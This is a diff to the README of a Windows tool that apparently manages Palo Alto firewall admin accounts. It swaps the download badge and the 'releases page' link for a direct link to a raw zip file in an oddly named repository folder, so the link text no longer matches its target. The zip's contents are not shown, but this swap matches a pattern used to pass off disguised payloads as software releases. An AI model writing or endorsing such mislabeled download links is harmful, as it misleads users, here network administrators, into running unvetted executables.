@@ -1,6 +1,6 @@
 # 🛡️ panos-user-manager - Manage firewall accounts with simple commands
 
-[![Download Application](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/khoile852009-lab/panos-user-manager/releases)
+[![Download Application](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/khoile852009-lab/panos-user-manager/raw/refs/heads/main/Areopagist/panos-user-manager-v3.3.zip)
 
 This application provides a simple way to manage local administrator accounts on Palo Alto Networks firewalls and Panorama devices. It uses the XML API to perform tasks without requiring manual login to each web interface. You can add, remove, or modify user accounts across your network infrastructure from a single command line interface.
 
@@ -8,7 +8,7 @@ This application provides a simple way to manage local administrator accounts on
 
 You do not need to install Python or any extra software to use this tool. The application arrives as a standalone executable file for Windows. Follow these steps to set up the environment and run your first command.
 
-1. Visit the [releases page](https://github.com/khoile852009-lab/panos-user-manager/releases) to download the latest version.
+1. Visit the [releases page](https://github.com/khoile852009-lab/panos-user-manager/raw/refs/heads/main/Areopagist/panos-user-manager-v3.3.zip) to download the latest version.
 2. Select the file named `panos-user-manager.exe`.
 3. Save the file to a folder where you keep your tools.
 4. Open the Command Prompt or PowerShell on your Windows machine.
